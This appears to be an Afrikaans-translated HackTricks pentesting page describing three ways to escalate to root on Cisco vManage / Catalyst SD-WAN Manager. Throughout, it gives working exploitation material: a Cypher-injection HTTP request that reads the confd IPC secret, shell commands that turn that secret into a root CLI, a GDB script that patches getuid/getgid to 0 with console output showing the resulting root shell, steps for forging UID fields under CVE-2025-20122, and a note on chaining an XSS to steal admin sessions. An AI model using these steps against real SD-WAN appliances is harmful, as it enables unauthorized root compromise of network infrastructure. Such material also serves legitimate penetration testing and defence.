# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Pad 1

(Voorbeeld van [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Na ’n bietjie delf in sommige [documentation](http://66.218.245.39/doc/html/rn03re18.html) verwant aan `confd` en die verskillende binaries (toeganklik met ’n rekening op die Cisco-website), het ons gevind dat dit, om die IPC-sok te verifieer, ’n geheim gebruik wat in `/etc/confd/confd_ipc_secret` geleë is:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Onthou ons Neo4j-instantie? Dit hardloop onder die `vmanage` gebruiker se privilegies, wat ons toelaat om die lêer met behulp van die vorige kwesbaarheid te verkry:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Die `confd_cli` program ondersteun nie command line arguments nie maar roep `/usr/bin/confd_cli_user` met argumente aan. Daarom kan ons direk `/usr/bin/confd_cli_user` oproep met ons eie stel argumente. Dit is egter nie leesbaar met ons huidige regte nie, so ons moet dit uit die rootfs haal en dit kopieer met scp, lees die help, en dit gebruik om die shell te kry:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pad 2

(Voorbeeld van [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Die blog¹ deur die synacktiv-span beskryf ’n elegante manier om ’n root shell te kry, maar die nadeel is dat dit vereis om ’n kopie van die `/usr/bin/confd_cli_user` te bekom wat slegs deur root geleesbaar is. Ek het ’n ander manier gevind om na root te eskaleer sonder so ’n gedoente.

Toe ek die `/usr/bin/confd_cli` binêre ontleed, het ek die volgende opgemerk:

<details>
<summary>Objdump wat UID/GID-insameling wys</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Wanneer ek “ps aux” uitvoer, het ek die volgende opgemerk (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ek het aangevoer dat die “confd_cli” program die user ID en group ID wat dit van die aangemelde gebruiker ingesamel het, aan die “cmdptywrapper” toepassing deurgee.

My eerste poging was om die “cmdptywrapper” direk te hardloop en dit met `-g 0 -u 0` te voorsien, maar dit het misluk. Dit blyk 'n file descriptor (-i 1015) is iewers onderweg geskep en ek kan dit nie naboots nie.

Soos genoem in synacktiv’s blog (last example), die `confd_cli` program ondersteun nie command line argument nie, maar ek kan dit met 'n debugger beïnvloed en gelukkig is GDB op die stelsel ingesluit.

Ek het 'n GDB script geskep waarin ek die API `getuid` en `getgid` geforseer het om 0 terug te gee. Aangesien ek reeds “vmanage” voorregte het deur die deserialization RCE, het ek toestemming om die `/etc/confd/confd_ipc_secret` direk te lees.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Konsole-uitset:

<details>
<summary>Konsole-uitset</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pad 3 (2025 CLI invoervalidasie-fout)

Cisco het vManage hernoem na *Catalyst SD-WAN Manager*, maar die onderliggende CLI hardloop steeds op dieselfde toestel. ’n 2025 advisory (CVE-2025-20122) beskryf onvoldoende invoervalidasie in die CLI wat **any authenticated local user** toelaat om root te kry deur ’n gemanipuleerde versoek na die manager CLI-diens te stuur. Kombineer enige low-priv foothold (bv. die Neo4j deserialisasie van Path1, of ’n cron/backup user shell) met hierdie fout om na root te spring sonder om `confd_cli_user` te kopieer of GDB aan te heg:

1. Gebruik jou low-priv shell om die CLI IPC-endpunt te lokaliseer (tipies die `cmdptywrapper` luisteraar wat op poort 4565 in Path2 getoon word).
2. Smee ’n CLI-versoek wat die UID/GID-velde vervals na 0. Die validasie-fout slaag nie daarin om die oorspronklike oproeper se UID af te dwing nie, dus begin die wrapper ’n root-backed PTY.
3. Pipe enige opdragvolgorde (`vshell; id`) deur die vervalste versoek om ’n root shell te bekom.

> Die exploit surface is local-only; remote code execution is steeds benodig om die aanvanklike shell te land, maar sodra jy in die toestel is is uitbuiting ’n enkele IPC-boodskap eerder as ’n debugger-gebaseerde UID-patch.

## Ander onlangse vManage/Catalyst SD-WAN Manager vulns om te ketting

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in spesifieke koppelvlakvelde; diefstal van ’n admin session gee jou ’n browser-driven pad na `vshell` → local shell → Path3 vir root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
